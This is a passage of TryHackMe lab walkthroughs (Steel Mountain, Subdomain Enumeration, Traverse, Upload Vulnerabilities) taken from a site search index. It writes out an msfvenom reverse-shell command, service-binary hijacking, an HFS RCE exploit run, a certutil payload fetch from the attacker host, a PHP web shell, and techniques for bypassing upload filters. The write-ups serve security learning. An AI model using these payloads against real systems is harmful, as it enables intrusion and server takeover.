<p>To enumerate the target machine, we will be using a Powershell script called PowerUP. The purpose of this script is to enumerate a machine to find common Windows privilege escalation vectors that rely on misconfigurations.</p> <p>Download the script and upload it to the target machine using the open Meterpreter session.</p> <p><pre><code>wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1\n</code></pre> </p> <p>To execute the script, we will first need to type <code>load powershell</code> followed by <code>powershell_shell</code> into the open Meterpreter session.</p> <p></p> <p>We can now run the PowerUp.ps1 script.</p> <p></p> <p>Note that the CanRestart option is set to True on the AdvancedSystemCareService9 service which is vulnerable to an unquoted service path vulnerability. The CanRestart being set to True allows us to restart the service on the system. Furthermore the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one and then restart the service which will run our infected program.</p> <p>Let's use msfvenom to generate a reverse shell as a Windows executable.</p> <p><pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.13.17.49 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe\n</code></pre> </p> <p>We can now upload our binary to replace the legitimate one at <code>C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe</code></p> <p></p> <p>Before we can replace the legitimate file, we need to stop the service which is running. We can use the regular cmd shell for this by using the <code>shell</code> command.</p> <p><pre><code>sc stop AdvancedSystemCareService9\n</code></pre> </p> <p>With the service stopped, we can now replace the legitimate file with our malicious file.</p> <p><pre><code>copy ASCService.exe \"C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe\"\n</code></pre> </p> <p>With the legitimate file replaced with our malicious one, we can now restart the AdvancedSystemCareService9 to get our privilege escalation. Before we do this though, we need to setup a listener.</p> <p><pre><code>nc -lvnp 4443\n</code></pre> <pre><code>sc start AdvancedSystemCareService9\n</code></pre> </p> <p></p> <p>The flag for the Administrator user can be found at <code>c:\\Users\\Administrator\\Desktop\\root.txt</code>.</p> <p></p>"},{"location":"walkthroughs/thm/steelmountain/#access-and-escalation-without-metasploit","title":"Access and Escalation Without Metasploit","text":"<p>In the previous sections, we exploited the machine with the aid of Metasploit. Let's look at how we can gain access to the machine without the use of Metasploit.</p> <p>Remember that our Nmap scan showed that the Rejetto Http File Server version 2.3 running on port 8080. Looking at Exploit-DB, we find several exploits for the specified version of the file server. The one that interest us is the remote command execution exploit (CVE-2014-6287). </p> <p>We will also need a Netcat static binary for the Windows OS (download from here). Remeber to rename the file to <code>nc.exe</code> as this is the name the exploit is looking for.</p> <p>Before we can run the exploit, we need to setup a web server to serve the Netcat binary on port 80 when the exploit executes.</p> <p><pre><code>python3 -m http.server 80\n</code></pre> Next we need to setup a Netcat listener to receive our call back.</p> <p><pre><code>nc -lvnp 4444\n</code></pre> Finally we can download the exploit from Exploit-DB. The exploit needs to be modified with our IP address and the Netcat port we are listening on.</p> <p></p> <p>With the options set, we can now run the exploit.</p> <p><pre><code>python2 39161.py 10.10.173.90 8080\n</code></pre> Note that we will need to run the exploit twice to get our shell. The reason is because the first time the exploit is executed, it pulls the Netcat binary from our server to the target machine. The second time the exploit is executed, we get a callback.</p> <p></p> <p>With our initial access established, we can do further enumeration using WinPEAS. We start by copying the script to our machine.</p> <pre><code>wget https://github.com/carlospolop/PEASS-ng/releases/download/20230529-e7da582f/winPEASx86.exe\n</code></pre> <p>We can now download the file on the target machine from our running web server using the certutil utility.</p> <p><pre><code>certutil.exe -urlcache -f http://10.13.17.49/winPEASx86.exe winpeas.exe\n</code></pre> </p> <p>Run WinPEAS by simply calling the executable. Execution can take a while as the utility goes through several enumeration checks.</p> <p>Looking at the results, we see that the WinPEAS utility found the same unquoted services as PowerUP did earlier. At this point, the method for privilege escalation is identical to before. Essentially the goal is to generate a payload using msfvenom and replace the legitimate binary with our malicious version. Once the AdvancedSystemCareService9 service is restarted, we get our root shell.</p>"},{"location":"walkthroughs/thm/subdomainenumeration/","title":"Subdomain Enumeration","text":""},{"location":"walkthroughs/thm/subdomainenumeration/#task-1-brief","title":"Task 1 - Brief","text":"<p>Subdomain enumeration is a process of finding valid subdomains for a domain. This allows us to expand our attack surface in order to discover more potential points of vulnerabilities.</p> <p>This room explores three different subdomain enumeration methods: 1. Brute Force 2. OSINT 3. Virtual Host</p>"},{"location":"walkthroughs/thm/subdomainenumeration/#task-2-osint-ssltls-certificates","title":"Task 2 - OSINT - SSL/TLS Certificates","text":"<p>When a Secure Sockets Layer/Transport Layer Security (SSL/TLS) certificate is created for a domain by a Certificate Authority (CA), CA's take part in what is called Certificate Transparency (CT) logs. These are publicly accessible logs of every SSL/TLS certificate created for a domain name. The primary purpose of CT logs is to stop malicious and accidentally made certificates from being used.</p> <p>We can use CT logs to our advantage to discover subdomains belonging to a domain. The following sites offer a searchable database of certificates that shows current and historical results: - Certificate Search - Certificate Transparency Search</p>"},{"location":"walkthroughs/thm/subdomainenumeration/#task-3-osint-search-engines","title":"Task 3 - OSINT - Search Engines","text":"<p>Using advanced search methods on websites like Google (such as <code>site:filter</code>) can help find subdomains. For example, a query such as <code>-site:www.domain.com site:*.domain.com</code> would only contain results leading to the domain name being searched.</p>"},{"location":"walkthroughs/thm/subdomainenumeration/#task-4-dns-brute-force","title":"Task 4 - DNS Brute Force","text":"<p>Brute-force DNS enumeration is a method of trying multitude of different possible subdomains from a pre-defined wordlist of commonly used subdomains. Since this method requires many requests, it is typically automated to make the process quicker. One of tools commonly used for this purpose is DNSrecon. The following is a standard syntax for most common use case:</p> <pre><code>dnsrecon -t brt -d example.com\n</code></pre>"},{"location":"walkthroughs/thm/subdomainenumeration/#task-5-osint-sublist3r","title":"Task 5 - OSINT - Sublist3r","text":"<p>To speed up the process of OSINT subdomain discovery, the above methods can be automated with a handy utility called Sublist3r. Sublist3r is a python tool designed to enumerate subdomains of a website using OSINT.</p> <p>Syntax for common use case is follows:</p> <pre><code>python3 sublist3r.py -d example.com\n</code></pre>"},{"location":"walkthroughs/thm/subdomainenumeration/#task-6-virtual-hosts","title":"Task 6 - Virtual Hosts","text":"<p>Some subdomains are not hosted in publicly accessible DNS results. Examples include development versions of a web application or administrator portals. Instead, the DNS records could be kept on a private DNS server or recorded on the developer's machines in their <code>/etc/hosts</code> file (or <code>C:\\windows\\system32\\drivers\\etc\\hosts</code> for Windows OS) which maps domain names to IP addresses.</p> <p>Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the Host header. We can utilize this host header by making changes to it and monitoring the response to see if we discover a new website.</p> <p>Like DNS brute-force, we can automate this process using a wordlist of commonly used subdomains and a utility called ffuf.</p> <p>Syntax for a common use case for subdomain enumeration using ffuf is as follows:</p> <p><pre><code>ffuff -w /usr/share/wordlists/seclists/Discover/DNS/namelists.txt -H \"Host:FUZZ.example.com\" -u http:www.example.com -fs {size} -v\n</code></pre> In the above syntax, the parameter <code>FUZZ</code> tells ffuf which element we want to it to fuzz using the provided wordlist. The <code>-fs</code> switch lets us filter our results based on file size (ie: ignore any results that are of the specified size; usually the most common occurring size value).</p>"},{"location":"walkthroughs/thm/traverse/","title":"Traverse","text":"<p>Let's begin by navigating to the web application's IP address. On the main page, we are greeted with a message indicating that site has been hacked. Looking at the webpage source, we find the website is using a custom JavaScript file <code>custom.min.js</code>.</p> <p></p> <p>Looking at the contents of <code>custom.min.js</code> we find that the code is obfuscated with <code>hex</code> encoding .</p> <p></p> <p><pre><code>// I WILL KEEP THE OBFUSCATED SO NO ONE CAN UNDERSTAND\n\n28 66 75 6E 63 74 69 6F 6E 28 29 7B 66 75 6E 63 74 69 6F 6E 20 64 6F 4E 6F 74 68 69 6E 67 28 29 7B 7D 76 61 72 20 6E 3D 22 44 49 52 45 43 54 4F 52 59 22 3B 76 61 72 20 65 3D 22 4C 49 53 54 49 4E 47 22 3B 76 61 72 20 6F 3D 22 49 53 20 54 48 45 22 3B 76 61 72 20 69 3D 22 4F 4E 4C 59 20 57 41 59 22 3B 76 61 72 20 66 3D 6E 75 6C 6C 3B 76 61 72 20 6C 3D 66 61 6C 73 65 3B 76 61 72 20 64 3B 69 66 28 66 3D 3D 3D 6E 75 6C 6C 29 7B 63 6F 6E 73 6F 6C 65 2E 6C 6F 67 28 22 46 6C 61 67 3A 22 2B 6E 2B 22 20 22 2B 65 2B 22 20 22 2B 6F 2B 22 20 22 2B 69 29 3B 64 3D 75 6E 64 65 66 69 6E 65 64 7D 65 6C 73 65 20 69 66 28 74 79 70 65 6F 66 20 66 3D 3D 3D 22 75 6E 64 65 66 69 6E 65 64 22 29 7B 64 3D 75 6E 64 65 66 69 6E 65 64 7D 65 6C 73 65 7B 69 66 28 6C 29 7B 64 3D 75 6E 64 65 66 69 6E 65 64 7D 65 6C 73 65 7B 28 66 75 6E 63 74 69 6F 6E 28 29 7B 69 66 28 64 29 7B 66 6F 72 28 76 61 72 20 6E 3D 30 3B 6E 3C 31 30 3B 6E 2B 2B 29 7B 63 6F 6E 73 6F 6C 65 2E 6C 6F 67 28 22 54 68 69 73 20 63 6F 64 65 20 64 6F 65 73 20 6E 6F 74 68 69 6E 67 2E 22 29 7D 64 6F 4E 6F 74 68 69 6E 67 28 29 7D 65 6C 73 65 7B 64 6F 4E 6F 74 68 69 6E 67 28 29 7D 7D 29 28 29 7D 7D 7D 29 28 29 3B\n</code></pre> Using CyberChef, we can deobfuscate the contents.</p> <p></p> <p><pre><code>(function(){function doNothing(){}var n=\"DIRECTORY\";var e=\"LISTING\";var o=\"IS THE\";var i=\"ONLY WAY\";var f=null;var l=false;var d;if(f===null){console.log(\"Flag:\"+n+\" \"+e+\" \"+o+\" \"+i);d=undefined}else if(typeof f===\"undefined\"){d=undefined}else{if(l){d=undefined}else{(function(){if(d){for(var n=0;n&lt;10;n++){console.log(\"This code does nothing.\")}doNothing()}else{doNothing()}})()}}})();\n</code></pre> Beautified using js-beautify:</p> <p><pre><code>(function() {\n    function doNothing() {}\n    var n = \"DIRECTORY\";\n    var e = \"LISTING\";\n    var o = \"IS THE\";\n    var i = \"ONLY WAY\";\n    var f = null;\n    var l = false;\n    var d;\n    if (f === null) {\n        console.log(\"Flag:\" + n + \" \" + e + \" \" + o + \" \" + i);\n        d = undefined\n    } else if (typeof f === \"undefined\") {\n        d = undefined\n    } else {\n        if (l) {\n            d = undefined\n        } else {\n            (function() {\n                if (d) {\n                    for (var n = 0; n &lt; 10; n++) {\n                        console.log(\"This code does nothing.\")\n                    }\n                    doNothing()\n                } else {\n                    doNothing()\n                }\n            })()\n        }\n    }\n})();\n</code></pre> Looking at the deobfuscated code, we can extract the flag value from the <code>console.log</code> function: <code>DIRECTORY LISTING IS THE ONLY WAY</code></p> <p>With no other leads on where to go from here, let's look at the page source again. Further down the page source-code, we see comments left by the developer indicating the endpoint where the logs are stored.</p> <p></p> <p>Navigating to the endpoint, we find a file containing email dumps: <code>email_dump.txt</code></p> <p><pre><code>From: Bob &lt;bob@tourism.mht&gt;\nTo: Mark &lt;mark@tourism.mht&gt;\nSubject: API Credentials\n\nHey Mark,\n\nSorry I had to rush earlier for the holidays, but I have created the directory for you with all the required information for the API.\nYou loved SSDLC so much, I named the API folder under the name of the first phase of SSDLC.\nThis page is password protected and can only be opened through the key. THM{100100111}\n\nSee ya after the holidays\n\nBob.\n</code></pre> The email hints that the API endpoint is named after the first phase of S-SDLC which is typically the project planning stage or <code>planning</code> for short. Based on this result, we have the endpoint credentials of: <code>THM{100100111}</code>. Navigating to the endpoint in the browser and logging in with the credentials yields documentation on an API endpoint <code>api/?customer_id=1</code>.</p> <p></p> <p>Using Burp Suite, we can extract the email address for <code>customer_id=5</code>.</p> <p></p> <p>Fuzzing the API endpoint using Burp Suite Intruder (or ffuf), we find that <code>customer_id=3</code> has admin privileges with the following credentials: <code>realadmin@traverse.com:admin_key!!!</code></p> <p></p> <p>We can log in using the above credentials at the <code>/realadmin</code> endpoint.</p> <p></p> <p></p> <p>The Admin Page allows us to execute two commands from the drop down menu: System Owner and Current Directory. Intercepting a request using Burp Suite shows that when executing a command, a POST request is made to the <code>/realadmin/main.php</code> with the request body parameter of <code>command</code>. We can modify the value of the parameter execute any command we desire.</p> <p></p> <p>Forwarding a request with the body parameter <code>command=ls</code> gives us a response with interesting results.</p> <p></p> <p>Based on the response received back from the server, the attacker uploaded a web shell named <code>thm_shell.php</code> and renamed a file used for managing the server to <code>renamed_file_manager.php</code>.</p> <p>Based on the notes, we can access the original file manager using the password <code>THM{10101}</code>. Navigating to <code>/realadmin/renamed_file_manager.php</code> gives us a log in prompt to access the Admin File Manager utility. We can log in using the above credentials.</p> <p></p> <p>With access to Admin File Manager, we can restore the original website and recover the flag by removing the \"FINALLY HACKED\" message in the <code>index.php</code> file. Incidentally, the flag can also be retrieved by simply reading it from the <code>index.php</code> file.</p> <p></p> <p></p> <p>Flag: <code>THM{WEBSITE_RESTORED}</code></p>"},{"location":"walkthroughs/thm/uploadvulnerabilities/","title":"Upload Vulnerabilities","text":""},{"location":"walkthroughs/thm/uploadvulnerabilities/#introduction","title":"Introduction","text":"<p>In this room, we will be exploring basic file-upload vulnerabilities in web applications. Before we begin, we need to modify our <code>/etc/hosts</code> file to include the following:</p> <p><pre><code>10.10.68.175    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm\n</code></pre> Note: Remove these lines when terminating the box.</p> <p>The server can be accessed with one of the following virtual hosts:</p> <ul> <li>overwrite.uploadvulns.thm</li> <li>shell.uploadvulns.thm</li> <li>java.uploadvulns.thm</li> <li>annex.uploadvulns.thm</li> <li>magic.uploadvulns.thm</li> <li>jewel.uploadvulns.thm</li> </ul>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#task-2-introduction","title":"Task 2 - Introduction","text":"<p>The ability to upload files to a server has become an integral part of how users interact with web applications. When handled poorly, file uploads can open up severe vulnerabilities in the server leading to anything from a minor nuisance to full Remote Code Execution (RCE) if an attacker manages to upload and execute a shell.</p> <p>The purpose of this room is to explore some of the vulnerabilities resulting from improper handling of file uploads. More specifically, the room will look at:</p> <ul> <li>Overwriting existing files on a server</li> <li>Uploading and Executing Shells on a server</li> <li>Bypassing Client-Side filtering</li> <li>Bypassing various kinds of Server-Side filtering</li> <li>Fooling content type validation checks</li> </ul>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#task-3-general-methodology","title":"Task 3 - General Methodology","text":"<p>First step to finding file upload vulnerabilities is to find the point of file upload. Enumeration and Recon are key here.</p> <p>With a basic understanding of how the website might be handling our input, we can then try to poke around and see what we can and can't upload. If the website is employing client-side filtering then we can easily look at the code for the filter and look to bypass it (more on this later!). If the website has server-side filtering in place then we may need to take a guess at what the filter is looking for, upload a file, then try something slightly different based on the error message if the upload fails. Uploading files designed to provoke errors can help with this. Tools like Burpsuite or OWASP Zap can be very helpful at this stage.</p>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#task-4-overwriting-existing-files","title":"Task 4 - Overwriting Existing Files","text":"<p>When a file is uploaded to the server, a range of checks should be carried out to ensure that the file will not overwrite an existing file on the server. A common practice is to assign the uploaded file a new name on the server-side. Alternatively, the server may perform a check to see if the file name already exist and return an error in the event the checks are true. File permissions can also assist in preventing files from being overwritten.</p> <p>To solve this challenge, navigate to <code>http://overwrite.uploadvulns.thm</code> and look at the source page. Our aim find a target image we can overwrite.</p> <p></p> <p>Let's download an image from the internet and rename it to <code>mountains.jpg</code>. Upload the downloaded file to overwrite the existing file.</p> <p></p> <p>Retrieved Flag: <code>THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}</code></p>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#task-5-remote-code-execution","title":"Task 5 - Remote Code Execution","text":"<p>In this challenge, we will looking at uploading a file to enable RCE on the server. RCE allows and attacker to execute arbitrary code on the web server. Generally this RCE happens as a low-privileged user (such as <code>www-data</code> on Linux servers) but it is a serious vulnerability none-the-less.</p> <p>Remote code execution via a file upload vulnerability in a web application tend to be exploited by uploading a program written in the same language as the back-end of the website (or another language which the server understands and will execute).</p> <p>It is worth nothing that in a routed application (an application where the routes are defined programmatically rather than being mapped to the file-system), this method of attack becomes a lot more complicated and a lot less likely to occur. Most modern web frameworks are routed programmatically.</p> <p>There are two basic ways to achieve RCE on a web server when exploiting a file upload vulnerability: webshells and reverse/bind shells. A full featured reverse/bind shell is the ideal goal for an attacker; however a webshell may be the only option available (for example, if a file length limit has been imposed on uploads or if firewall rules prevent any network-based shells).</p> <p>As a general methodology, we would be looking to upload a shell, then activate it either by navigating directly to the file if the server allows it (non-routed applications with inadequate permissions) or by otherwise forcing the webapp to run the script for us (necessary in routed applications).</p> <p>For this challenge, our target will be: <code>http://shell.uploadvulns.thm</code></p> <p>Before we can proceed, we need to enumerate the host to find our upload point on the web application. We can use several tools but in our case we will be using Feroxbuster.</p> <p></p> <p>We have two possible directories which could be used for uploads. The directory called <code>/resources</code> seems the most promising. Let's upload a dummy file to see if our assumption is correct.</p> <p></p> <p>Looks like our assumption was correct. Let's go ahead and craft a simple web shell to test with first. A simple web shell in PHP can be coded as follows:</p> <p><pre><code>&lt;?php\n    echo system($_GET[\"cmd\"]);\n?&gt;\n</code></pre> Upload the PHP web shell to the the web application and activate it from the <code>/resources</code> directly.</p> <p></p> <p>Since our PHP shell retrieves a command to execute using a GET request, we can execute our shell by inputting the desired commands in the URL as follows:</p> <p><pre><code>http://http://shell.uploadvulns.thm/resources/shell.php?cmd=whoami;ls;id\n</code></pre> </p> <p>Note that it is sometimes better to view the page source code as the formatting of the returned results may be better.</p> <p></p> <p>Using this method, we can extract the flag located in <code>/var/www/</code> directory by systematically finding the name of the flag file and then using cat to output the flag.</p> <pre><code>http://shell.uploadvulns.thm/resources/shell.php?cmd=ls%20/var/www/\nhttp://shell.uploadvulns.thm/resources/shell.php?cmd=cat%20/var/www/flag.txt\n</code></pre> <p></p> <p>Let's try to retrieve this flag using a reverse shell. We can use the PHP reverse shell from: <code>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</code></p> <p>Configure the reverse shell with our <code>tun 0</code> IP address, save and upload this to the web application.</p> <p></p> <p>Start a Netcat listner on port <code>1234</code> and execute the shell by navigating to the file and clicking on it:</p> <p><pre><code>$ nc -lvnp 1234\n</code></pre> We have a reverse shell!</p> <p></p> <p>Let's retrieve the flag.</p> <p></p> <p>Retrieved Flag: <code>THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}</code></p>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#task-6-filtering","title":"Task 6 - Filtering","text":"<p>Input filtering is a common defence technique employed by web developers against file upload vulnerabilities. See [[platform.thm.adventofcyber2022.day15]] for more information regarding unrestricted file uploads and strategies to defend against file upload vulnerabilities.</p> <p>I this challenge, we will be looking at some of the defence mechanisms used by web developers to prevent malicious file uploads and how to circumvent them.</p> <p>Before we begin, let's discuss the difference between client-side and server-side filtering.   - Client-Side: Client-side in context of web applications means that it is running in the user's browser as opposed to on the web server itself. JavaScript is very common as the client-side language. A client-side script will run in a user's we browser. Client-side filtering is trivial to bypass and as such client-side filtering by itself is a highly insecure method of verifying that na uploaded file is not malicious.   - Server-Side: Server-side scripts run on the server. PHP is predominantly used as a server-side language (with Microsoft's ASP for IIS coming in a close second). Server-side filtering tends to be more difficult to bypass. As the code is executed on the server, it would be impossible to bypass the filter completely; instead the attacker would need to form a payload which conforms to the filters in place while still allowing the attacker to execute the payload.</p> <p>With the above in mind, let's look at different kind of filtering.</p>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#extension-validation","title":"Extension Validation","text":"<p>File extensions can be used to identify the contents of a file. In practice they are very easy to change. Note that Microsoft Windows still uses file extensions to identify file types while UNIX based systems tend to rely on other methods (discussed further below).</p> <p>Filters that check for file extensions work in one of two ways:  - Blacklist extensions - have a list of extensions which are not allowed.  - Whitelist extensions - have a list of extensions which are allowed while rejecting everything else.</p>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#file-type-filtering","title":"File Type Filtering","text":"<p>File type filtering is similar to file extension validation but instead looks at HTTP request headers to verify that the contents of a file are acceptable to upload.   - MIME Validation: MIME (or Multipurpose Internet Mail Extension) types are used as an identifier for files. The MIME type for a file upload is attached in the HTTP request header.</p> <p>    MIME types (Content-Type) follow the format <code>/</code>. I the HTTP request above, an image <code>spaniel.jpg</code> with a MIME type (or Content-Type) of <code>image/jpeg</code> was uploaded.</p> <p>The MIME type for a file can be checked client-side and/or server-side. Since MIME type is based on the extension of the file, it is extremely easy to bypass.   - Magic Number Validation: Magic numbers are the more accurate way of determining the content of a file. The magic number of a file is a string of bytes at the very beginning of a the file content which identify the content (List of file signatures - Wikipedia). Unlike Windows, Unix systems use magic numbers for identifying files. This is not a guaranteed solution but it is more effective than checking the extension of the file alone.</p>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#file-length-filtering","title":"File Length Filtering","text":"<p>File length filters are used to prevent huge files from being uploaded to the server via an upload form. This technique is most often used to prevent attacks which can potentially starve the server of resources thus preventing (or denying) other users the ability to upload files. These types of attacks are commonly referred to as denial of service attacks.</p>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#file-name-filtering","title":"File Name Filtering","text":"<p>Typically, files uploaded to a server should be unique. Usually this means adding a random aspect to the file name. Alternatively, developers can check if a file with the same name already exists on the server and provide an error to the user if such is the case. Additionally, file names should be sanitized on upload to ensure that they don't contain any bad characters which could potentially cause problems on the file system when uploaded (ie. null bytes or forward slashes or control characters such as <code>;</code> and potential unicode characters).</p> <p>This means that on well administered servers, our uploaded files are unlikely to have the same name we ave them before uploading.</p>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#file-content-filtering","title":"File Content Filtering","text":"<p>File content filtering is more complicated as it requires a scan of the full contents of an uploaded file to ensure that it's not spoofing its extension, MIME and magic number. This is a significantly more complex process that majority of the basic filtration systems employed.</p>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#task-7-bypassing-client-side-filtering","title":"Task 7 - Bypassing Client-Side Filtering","text":"<p>In this task we will be looking at bypassing client-side filtering. As mentioned in the previous section, client-side filtering tends to extremely easy to bypass as it occurs entirely on the machine controlled by the attacker.</p> <p>There are for easy ways to bypass client-side file upload filters:   - Turn off Javascript in your browser - this will work provided the site doesn't require Javascript in order to provide basic functionality.   - Intercept and modify the incoming web request - using tools like Burp Suite, we can intercept the incoming web request and strip out the Javascript filter before it has a chance to run. More on this below.   - Intercept and modify the file upload - where the methods work before the webpage is loaded, this method allows the web page to load as normal but intercepts the file upload after it's already passed (and been accepted by the filter). More on this below.   - Send the file directly to the upload point - Why use the webpage with the filter when the file can be sent directly using a tool like <code>curl</code>? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. To use this method, you would first need to intercept a successful upload (using Burp Suite) to see the parameters being used in the upload which can then be slotted into the following command: <code>curl -X POST -F \"submit:&lt;value&gt;\" -F \"&lt;file-parameter&gt;:@&lt;path-to-file&gt;\" &lt;site&gt;</code></p>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#practical-example","title":"Practical Example","text":"<p>Let's look at a practical example below. Before we can begin, we need to to enumerate the website to find possible location for our uploaded files. Let's upload a test file and then run a tool like <code>feroxbuster</code> to enumerate the host.</p> <p>Looking at the source-page, we find that a client-side filter is being employed with a white-list for file extension <code>png</code>.</p> <p><pre><code>window.onload = function(){\n    var upload = document.getElementById(\"fileSelect\");\n    var responseMsg = document.getElementsByClassName(\"responseMsg\")[0];\n    var errorMsg = document.getElementById(\"errorMsg\");\n    var uploadMsg = document.getElementById(\"uploadtext\");\n    upload.value=\"\";\n    upload.addEventListener(\"change\",function(event){\n        var file = this.files[0];\n        responseMsg.style = \"display:none;\";\n        if (file.type != \"image/png\"){\n            upload.value = \"\";\n            uploadMsg.style = \"display:none;\";\n            error();\n        } else{\n            uploadMsg.innerHTML = \"Chosen File: \" + upload.value.split(/(\\\\|\\/)/g).pop();\n            responseMsg.style=\"display:none;\";\n            errorMsg.style=\"display:none;\";\n            success();\n        }\n    });\n};\n</code></pre> Let's upload a test image and begin our enumeration.</p> <p></p> <p></p> <p></p> <p>Now that we know where our uploaded files are being stored, let's go ahead and upload our reverse shell. Like before, we will use the following PHP reverse shell with the IP address set to our current tun0 IP address and port <code>1234</code>.</p> <p>Rename the reverse shell to have a file extension of <code>png</code> in order to bypass the client-side filter.</p> <p>Let's open Burp Suite and configure our browser to use Burp Proxy. One the vulnerable web application, select our malicious file.</p> <p></p> <p>Ensure Intercept is on and click Upload on the web application to capture the request.Notice the file name and Content-Type in the request header.</p> <p></p> <p>Let's modify the filename from <code>shell.png</code> to <code>shell.php</code> and Content-Type from <code>image/png</code> to <code>text/x-php</code> and forward the request to the server.</p> <p></p> <p></p> <p>Let's get our our Netcat listener and execute the payload by navigating to the uploaded file located at: <code>http://java.uploadvulns.thm/images/shell.php</code></p> <p><pre><code>$ nc -lvnp 1234\n</code></pre> We have a shell and our flag.</p> <p></p> <p></p> <p>Retrieved Flag: <code>THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}</code></p>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#task-8-bypassing-server-side-filtering-file-extensions","title":"Task 8 - Bypassing Server-Side Filtering: File Extensions","text":"<p>Server-side filters are more difficult to bypass by comparison as we do not have access to the backend filter code. Bypassing server-side filters often involve and iterative process to test and build up a payload which conforms to the filter's restrictions.</p> <p>Let's begin by looking at web applications that use a blacklist for file extensions as a server side filter. There are a variety of ways this could be coded and the bypass technique used is dependant on that. A simple example code for a blacklist file extension filter is presented below:</p> <p><pre><code>&lt;?php\n    //Get the extension\n    $extension = pathinfo($_FILES[\"fileToUpload\"][\"name\"])[\"extension\"];\n    //Check the extension against the blacklist -- .php and .phtml\n    switch($extension){\n        case \"php\":\n        case \"phtml\":\n        case NULL:\n            $uploadFail = True;\n            break;\n        default:\n            $uploadFail = False;\n    }\n?&gt;\n</code></pre> In the example above, the code is looking for the last period <code>.</code> in the file name and uses that to confirm the extension. Other ways the code could be working include: searching for the first period in the filename or splitting the file name at each period and checking to see if any blacklisted extensions show up.</p> <p>In the example code above, we can see that the developers are filtering out <code>.php</code> and <code>.phtml</code> extensions so if an attacker wanted to upload a PHP script, another extension will need to be used. There are a variety of other more rarely used PHP extensions that web servers may recognize: <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.php7</code>, <code>.phps</code>, <code>.php-s</code>, <code>.pht</code>, and <code>.phar</code>. Many of these bypass the filter (which only blocks <code>.php</code> and <code>.phtml</code>). Note the other PHP extensions will only work if the server is configured to recognize them as PHP files otherwise the server  will simply attempt to display the content of the file without the server actually executing the file.</p> <p>Now let's consider a black-box system where we don't have prior knowledge of the source code. The first steps are to enumerate what extensions are permitted and what extensions are blacklisted. Depending on how the filter is implemented, an attacker may be able to append a blacklisted extension to an allowed extension. For example, a server permits <code>.jpg</code> extension but filters out <code>.php</code> and all of its permutations, a simple payload may include modifying the accepted file extension with a blacklisted one (ie. modify <code>shell.jpg</code> to <code>shell.jpg.php</code>). This is not guaranteed to work as this is highly dependent on filter configuration but is a good start.</p>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#practical-example_1","title":"Practical Example","text":"<p>Let's look at a practical example. Navigate to: <code>http://annex.uploadvulns.thm/</code></p> <p>In the terminal box on the web application, type help to get the syntax required to select and upload a file.</p> <p>Let's go ahead and select an image file and upload it. Using <code>feroxbuster</code> we can enumerate the host to find out that our uploaded files are being stored in the <code>/privacy</code> folder.</p> <p></p> <p>Let's try uploading our PHP reverse shell.</p> <p></p> <p>Looks like the extension <code>.php</code> is being filtered out. Iterating through the different PHP extensions, it seems that <code>.php5</code> is not being filtered and as such we are able to upload it to the server.</p> <p></p> <p>Let's setup up our Netcat listener and execute the payload a: <code>http://annex.uploadvulns.thm/privacy</code></p> <p></p> <p>Retrieved Flag: <code>THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}</code></p>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#task-9-bypassing-server-side-filtering-magic-numbers","title":"Task 9 - Bypassing Server-Side Filtering: Magic Numbers","text":"<p>Magic numbers are used as more accurate identifiers for files. The magic numbers are a string of hexadecimal numbers which are always the very first thing in a file. With this knowledge, it is possible to use magic numbers to validate file uploads by simply reading those first few bytes and comparing them against either a whitelist or a blacklist. This can be very a technique against PHP based web servers however it can sometimes fail against other types of web servers.</p> <p>Let's drive right into a practical example.</p> <p>Trying to upload our PHP reverse shell, we get an error message that only GIFs are allowed.</p> <p>Before doing anything else, let's run the <code>file</code> command on our PHP reverse shell.</p> <p><pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[/dev/shm]\n\u2514\u2500$ file shell.php \nshell.php: PHP script, ASCII text\n</code></pre> Here we notice that Linux identifies the file correctly as PHP file. We want to pass this file off as a JPEG so let's open up the PHP file and add 4 random placeholder characters to the beginning of the file. The reason we are adding 6 characters is because the magic number has the hex signature of <code>47 49 46 38 39 61</code>.</p> <p></p> <p>Now open the file in <code>hexeditor</code> and replace the placeholder characters with the hex signature for a GIF.</p> <p></p> <p>Running <code>File</code> on <code>shell.php</code> we notice that the Linux now recognizes it as a GIF instead of a PHP file.</p> <p><pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[/dev/shm]\n\u2514\u2500$ file shell.php\nshell.php: GIF image data, version 89a, 15370 x 28735\n</code></pre> Let's select and upload our file to the server.</p> <p></p> <p>We now need to figure out where the file was uploaded to. We can again use <code>feroxbuster</code> to enumerate the host and find possible locations. Most likely place found by <code>feroxbuster</code> appear to be a directory called <code>/graphics</code> but it looks like directory indexing is disabled. We will have to execute the shell by navigating directly to the uploaded file at: <code>http://magic.uploadvulns.thm/graphics/shell.php</code></p> <p></p> <p>Retrieved Flag: 